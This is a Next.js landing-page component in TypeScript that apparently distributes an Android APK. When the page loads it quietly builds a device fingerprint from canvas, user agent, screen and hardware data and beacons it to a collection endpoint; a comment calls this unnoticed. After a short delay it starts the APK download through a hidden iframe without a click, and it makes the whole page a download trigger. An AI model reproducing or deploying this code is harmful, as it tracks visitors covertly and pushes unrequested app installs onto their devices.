"use client";

import { useCallback, useEffect, useRef } from "react";

interface Props {
  apkUrl: string;
  imageUrl: string;
  title: string;
  autoDownload: boolean;
  promo: string;
}

// 轻量设备指纹:综合屏幕/时区/UA/canvas 生成稳定字符串
function buildFingerprint(): string {
  const parts: string[] = [
    navigator.userAgent,
    navigator.language,
    screen.width + "x" + screen.height + "x" + screen.colorDepth,
    String(new Date().getTimezoneOffset()),
    String((navigator as any).hardwareConcurrency || ""),
    String((navigator as any).deviceMemory || ""),
  ];
  try {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    if (ctx) {
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillText("fp-probe-中文", 2, 2);
      parts.push(c.toDataURL());
    }
  } catch {}
  // 简单哈希
  let h = 0;
  const s = parts.join("|");
  for (let i = 0; i < s.length; i++) {
    h = (h << 5) - h + s.charCodeAt(i);
    h |= 0;
  }
  return Math.abs(h).toString(16);
}

export default function ExitLanding({ apkUrl, imageUrl, title, autoDownload, promo }: Props) {
  const started = useRef(false);
  const collected = useRef(false);
  const downloadFrames = useRef<HTMLIFrameElement[]>([]);
  const cleanupTimers = useRef<number[]>([]);

  const getVisitId = useCallback(() => {
    const params = new URLSearchParams(window.location.search);
    const visitId = Number(params.get("v") || 0);
    return Number.isFinite(visitId) ? visitId : 0;
  }, []);

  const markDownloaded = useCallback((visitId: number) => {
    if (!visitId) return;
    navigator.sendBeacon?.(
      "/api/downloaded",
      new Blob([JSON.stringify({ id: visitId })], { type: "application/json" })
    );
  }, []);

  const triggerDownload = useCallback((countDownload = true) => {
    if (!apkUrl) return;

    const visitId = getVisitId();
    if (countDownload) markDownloaded(visitId);

    const iframe = document.createElement("iframe");
    iframe.src = apkUrl;
    iframe.title = "download";
    iframe.setAttribute("aria-hidden", "true");
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    downloadFrames.current.push(iframe);
    const timer = window.setTimeout(() => {
      iframe.remove();
      downloadFrames.current = downloadFrames.current.filter((item) => item !== iframe);
      cleanupTimers.current = cleanupTimers.current.filter((item) => item !== timer);
    }, 15000);
    cleanupTimers.current.push(timer);
  }, [apkUrl, getVisitId, markDownloaded]);

  useEffect(() => {
    if (collected.current) return;
    collected.current = true;

    const conn = (navigator as any).connection;
    const payload = {
      id: getVisitId(),
      promo,
      screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}x`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      network: conn ? conn.effectiveType || "" : "",
      fingerprint: buildFingerprint(),
    };

    // 回填客户端采集信息(瞬间执行,无感)
    navigator.sendBeacon?.("/api/collect", new Blob([JSON.stringify(payload)], { type: "application/json" }));
  }, [getVisitId, promo]);

  useEffect(() => {
    if (started.current || !autoDownload || !apkUrl) return;
    started.current = true;

    // 贴近 smcy.shop：页面挂载后延迟尝试打开中转下载页；浏览器拦截时由用户点击兜底。
    const t = setTimeout(() => triggerDownload(false), 2500);
    return () => clearTimeout(t);
  }, [apkUrl, autoDownload, triggerDownload]);

  useEffect(() => {
    return () => {
      cleanupTimers.current.forEach((timer) => window.clearTimeout(timer));
      downloadFrames.current.forEach((frame) => frame.remove());
      cleanupTimers.current = [];
      downloadFrames.current = [];
    };
  }, []);

  const handlePageClick = useCallback(() => {
    triggerDownload(true);
  }, [triggerDownload]);

  return (
    <main
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        gap: 20,
        padding: "24px 24px 112px",
        textAlign: "center",
        cursor: apkUrl ? "pointer" : "default",
      }}
      onClick={handlePageClick}
    >
      <h1 style={{ fontSize: 22 }}>{title}</h1>
      {imageUrl ? (
        // eslint-disable-next-line @next/next/no-img-element
        <img
          src={imageUrl}
          alt={title}
          style={{ maxWidth: "100%", maxHeight: "70vh", borderRadius: 8 }}
        />
      ) : null}
      <button
        onClick={(e) => {
          e.stopPropagation();
          triggerDownload(true);
        }}
        style={{
          position: "fixed",
          left: "50%",
          bottom: 24,
          transform: "translateX(-50%)",
          minWidth: 220,
          minHeight: 58,
          padding: "14px 36px",
          fontSize: 18,
          fontWeight: 700,
          background: "#2563eb",
          color: "#fff",
          border: "none",
          borderRadius: 999,
          cursor: "pointer",
          boxShadow: "0 16px 34px rgba(37,99,235,0.28)",
        }}
      >
        立即下载
      </button>
      <p style={{ color: "#888", fontSize: 13 }}>若未弹出下载,请点击页面任意位置</p>
    </main>
  );
}
